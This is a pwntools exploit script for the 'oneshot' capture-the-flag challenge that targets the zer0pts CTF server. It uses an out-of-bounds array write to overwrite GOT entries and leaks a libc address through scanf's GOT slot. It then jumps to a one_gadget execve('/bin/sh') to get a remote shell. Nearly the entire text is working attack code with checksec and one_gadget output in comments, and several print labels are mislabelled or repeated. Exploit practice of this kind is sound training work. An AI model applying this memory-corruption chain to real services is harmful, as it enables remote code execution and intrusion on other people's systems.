from pwn import *

'''
root@kali:/home/kali/Desktop/oneshot# checksec chall 
[*] '/home/kali/Desktop/oneshot/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

No PIE -> ROP ALERT!

'''
#libc_base = 0x7ffff7df0000
#magic_gadget = libc_base + 0xcbcc0
#print('magic gadget = ', magic_gadget)
local_bin = "./chall"
addr_skip = 0x4007a8

libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")

p = remote("pwn.ctf.zer0pts.com", 9004)

#p = gdb.debug(local_bin, '''
	#break _start
	#break *main+66
  #break *main+149
  #break *main+211
  #break *main+104
  #break *main+86
  #continue
  #''')

elf = ELF(local_bin)
rop = ROP(elf)
ret_gadget = (rop.find_gadget(['ret']))[0]
print("ret_gadget = ", (ret_gadget))

#call_rax_gadget = (rop.find_gadget(['call rax']))[0]
call_rax_gadget = 0x004005c8
print("call_rax_gadget = ", (call_rax_gadget))

#size
print("[+] Iteration 1")
rop_size = b'-1'
output = p.recvuntil(b'n = ')
print(output)
p.sendline(rop_size)

output = p.recvuntil(b'i = ')
print(output)
puts_plt = 0x601018
index = (0x601018)/4
index = str(index)
index = b'' + index.encode()
index = index[:-2]
main_plt = 4196151
print("[+] Overwriting puts_plt with main_plt")
print("[+] Main_plt is at ", hex(main_plt))
print("[+] Index = ", index)
p.sendline(index)


output = p.recvuntil('arr[')
print(output)
p.sendline(str(main_plt))

##################################################################
##################################################################
print("[+] Iteration 2")
output = p.recvuntil(b'n = ')
print(output)
size = b'-1'
p.sendline(size)

output = p.recvuntil(b'i = ')
print(output)
exit_plt = elf.got['exit']
index = (exit_plt)/4
index = str(index)
index = b'' + index.encode()
index = index[:-2]
print_plt = elf.got['printf']
print("[+] Overwriting exit_plt with call_rax_gadget")
print("[+] Call_rax_gadget is at ", hex(call_rax_gadget))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(str(call_rax_gadget))
#p.sendline(str(ret_gadget))

##################################################################
##################################################################

print("[+] Iteration 3")
output = p.recvuntil(b'n = ')
print(output)
size = b'-1'
p.sendline(size)

output = p.recvuntil(b'i = ')
print(output)
calloc_plt = elf.got['calloc']
#0x400606
print_plt = elf.plt['printf']
index = (calloc_plt)/4
index = str(index)
index = b'' + index.encode()
index = index[:-2]
print("[+] Overwriting calloc_plt with print_plt")
print("[+] Print_plt is at ", hex(print_plt))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(str(print_plt))

##################################################################
##################################################################


print("[+] Iteration 4")
output = p.recvuntil(b'n = ')
print(output)

#address to skip calloc, exit will do a call rax 
size = b'4196264'
p.sendline(size)

output = p.recvuntil(b'i = ')
print(output)
calloc_plt = elf.got['calloc']
print_plt = elf.got['printf']
index = (calloc_plt)/4 + 1
index = str(index)
index = b'' + index.encode()
index = index[:-2]
print("[+] Overwriting calloc_plt with print_plt")
print("[+] Print_plt is at ", hex(print_plt))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(b'0')

##################################################################
##################################################################

print("[+] Iteration 5")
output = p.recvuntil(b'n = ')
print(output)

#address to skip calloc, exit will do a call rax 
size = b'4196264'
p.sendline(size)

output = p.recvuntil(b'i = ')
print(output)
exit_plt = elf.got['exit']
index = (exit_plt)/4
index = str(index)
index = b'' + index.encode()
index = index[:-2]
print_plt = elf.got['printf']
print("[+] Overwriting exit_plt with ret_gadget")
print("[+] Ret_gadget is at ", hex(ret_gadget))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(str(ret_gadget))
##################################################################
##################################################################


print("[+] Iteration 6 (Arbitary Read Write Archived)")
print("[+] Reading __isoc99_scanf@got.plt")
output = p.recvuntil(b'n = ')
print(output)

#address to skip calloc, exit will do a call rax 
size = b'6295616'
p.sendline(size)

output = p.recvuntil(b'i = ')
print(output)

leak = output[:-4]
print("[+] Leak = ", leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] __isoc99_scanf@got.plt = ", hex(leak_dec))

libc_base = leak_dec - libc.sym["__isoc99_scanf"]
print("[+] libc_base = ", hex(libc_base))

libc.address = libc_base
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
MAGIC_GADGET = libc_base + 0xe6c81
#MAGIC_GADGET = libc_base + 0xcbcc0 #local copy
print("[+] BINSH = ", hex(BINSH))
print("[+] SYSTEM = ", hex(SYSTEM))
print("[+] EXIT = ", hex(EXIT))
print("[+] MAGIC_GADGET  = ", hex(libc_base + 0xcbcc0))

print("[+] MAGIC_GADGET  = ", str(hex(MAGIC_GADGET)))
print("[+] MAGIC_GADGET[0]  = ", str(hex(MAGIC_GADGET))[0:6])
MAGIC_GADGET_1 = int(str(hex(MAGIC_GADGET))[0:6], 16)
print("[+] MAGIC_GADGET_1  = ", MAGIC_GADGET_1)

#writing exit_plt to skip calloc to allow overwrite
index = (exit_plt)/4 - 2
index = str(index)
index = b'' + index.encode()
index = index[:-2]
print_plt = elf.got['printf']
print("[+] Overwriting exit_plt with call_rax_gadget")
print("[+] Call_rax_gadget is at ", hex(call_rax_gadget))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(b'96993280')
##################################################################
##################################################################

print("[+] Iteration 4")
output = p.recvuntil(b'n = ')
print(output)

#address to skip calloc, exit will do a call rax 
size = b'4196264'
p.sendline(size)

output = p.recvuntil(b'i = ')
print(output)
calloc_plt = elf.got['calloc']
print_plt = elf.got['printf']
index = (calloc_plt)/4 + 1
index = str(index)
index = b'' + index.encode()
index = index[:-2]
print("[+] Overwriting calloc_plt with print_plt")
print("[+] Print_plt is at ", hex(print_plt))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(str(MAGIC_GADGET_1))
##################################################################
##################################################################

print("[+] Iteration 4")
output = p.recvuntil(b'n = ')
print(output)

#address to skip calloc, exit will do a call rax 
size = b'4196264'
p.sendline(size)

output = p.recvuntil(b'i = ')
print(output)
calloc_plt = elf.got['calloc']
print_plt = elf.got['printf']
index = (calloc_plt)/4 + 1 - 1
index = str(index)
index = b'' + index.encode()
index = index[:-2]
print("[+] Overwriting calloc_plt with print_plt")
print("[+] Print_plt is at ", hex(print_plt))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(str(MAGIC_GADGET))





##################################################################
##################################################################

print("[+] Iteration 7 (Read Write Done)")
print("[+] Trigger calloc, Jump to magic gadget")
output = p.recvuntil(b'n = ')
print(output)
size = b'0'
p.sendline(size)

'''
#address to skip calloc, exit will do a call rax 


output = p.recvuntil(b'i = ')
print(output)


#random place to write address
index = (puts_plt)/4
index = str(index)
index = b'' + index.encode()
index = index[:-2]

print("[+] Overwriting placeholder address with magic_gadget")
#print("[+] Ret_gadget is at ", hex(ret_gadget))
print("[+] Index = ", index)
p.sendline(index)

output = p.recvuntil('arr[')
print(output)
p.sendline(str(0x601106))
'''

#setbuf@got.plt is at 0x601020
p.interactive()


'''
one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so

0xcbcba execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbcbd execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbcc0 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL


'''